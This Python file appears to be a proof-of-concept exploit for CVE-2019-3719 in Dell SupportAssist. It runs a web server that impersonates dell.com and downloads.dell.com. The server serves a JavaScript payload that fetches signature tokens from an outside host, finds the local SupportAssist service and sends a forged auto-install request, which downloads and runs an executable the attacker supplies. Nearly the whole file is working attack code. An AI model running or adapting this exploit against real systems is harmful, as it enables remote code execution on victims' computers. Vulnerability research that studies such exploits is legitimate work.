from aiohttp import web
import asyncio
import string
import random
from threading import Thread

filename = ""
PAYLOAD = '''<script>var signatures = null;
var ports = [8884, 8883, 8886, 8885];
var server_port = 0;

function SendRequest(url) {
    var x = new XMLHttpRequest();
    x.open("GET", url, false);
    //x.timeout = 3500;
    x.send(null);    
    return {status: x.status, text: x.responseText};
}

function SendAsyncRequest(url, callback) {
    var x = new XMLHttpRequest();
    x.open("GET", url, true);
    x.onreadystatechange = callback;
    //x.timeout = 3500;
    x.send(null);    
    return {status: x.status, text: x.responseText};
}

function InitializeSignatures() {
    var signature_url = "https://bills-sandbox.000webhostapp.com/GetDellSignatures.php";
    var response = SendRequest(signature_url);

    if(response.status == 200) {
        signatures = JSON.parse(response.text);
    } else { // fuck this shouldn't happen
        console.log("fuck");
    }
}

function FindServer() {
    ports.forEach(function(port) {
        var is_alive_url = "http://127.0.0.1:" + port + "/clientservice/isalive/?expires=" + signatures.Expires + "&signature=" + signatures.IsaliveToken;
        var response = SendAsyncRequest(is_alive_url, function(){server_port = port;});
    });
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
}

function SendRCEPayload() {
    var auto_install_url = "http://127.0.0.1:" + server_port + "/downloadservice/downloadandautoinstall?expires=" + signatures.Expires + "&signature=" + signatures.DownloadAndAutoInstallToken;

    var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
    xmlhttp.open("POST", auto_install_url, true);

    var files = [];
    files.push({
        "title": "SupportAssist RCE",
        "category": "Serial ATA",
        "name": "calc.EXE",
        "location": " http://downloads.dell.com/calc.EXE", // those spaces are KEY
        "isSecure": false,
        "fileUniqueId": guid(),
        "run": true,
        "installOrder": 2,
        "restricted": false,
        "fileStatus": -99,
        "driverId": "FXGNY",
        "dupInstallReturnCode": 0,
        "cssClass": "inactive-step",
        "isReboot": false,
        "scanPNPId": "PCI\\VEN_8086&DEV_282A&SUBSYS_08851028&REV_10",
        "$$hashKey": "object:210"});

    xmlhttp.send(JSON.stringify(files));
}

function GetClientSystemInfo() {
    var signature = signatures.ClientSystemInfoToken;
    var expires = signatures.Expires;
    var system_info_url = "http://127.0.0.1:" + server_port + "/clientservice/getclientsysteminfo?expires=" + signatures.Expires + "&signature=" + signatures.ClientSystemInfoToken + "&includeServiceTag=true&includeHealthInfo=true&includeCurrentsystemConfig=true";

    SendAsyncRequest(system_info_url, function(){ console.log(this.responseText);});

}

var port_timer;
function onFindPort() {
    clearTimeout(port_timer);
    SendRCEPayload();
}

InitializeSignatures();
FindServer();

port_timer = setTimeout(function(){if(server_port != 0){onFindPort()}}, 200);</script><h1>CVE-2019-3719</h1>'''


def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def handle(request):
    global filename
    global PAYLOAD
    if request.headers["Host"] is not None:
        if "downloads.dell.com" in request.headers["Host"]:
            print("[+] Exploit binary requested.")
            return web.FileResponse(filename)
        elif "dell.com" in request.headers["Host"]:
            print("[+] Exploit payload requested.")
            return web.Response(text=PAYLOAD, headers={'Content-Type': 'text/html'})

    redirect_url = "http://dellrce.dell.com"
    return web.HTTPFound(redirect_url)


class WebServer:
    def __init__(self, payload_filename):
        global filename
        filename = payload_filename

        self.loop = asyncio.get_event_loop()
        app = web.Application(debug=True)
        app.add_routes([web.get('/{a:.*}', handle)])
        handler = app.make_handler()
        self.server = self.loop.create_server(handler, host='0.0.0.0', port=80)

        self.server_thread = Thread(target=self.server_handler, args=(self,))
        self.server_thread.start()
        print("[+] Webserver started.")

    def server_handler(self, arg):
        self.loop.run_until_complete(self.server)
        self.loop.run_forever()
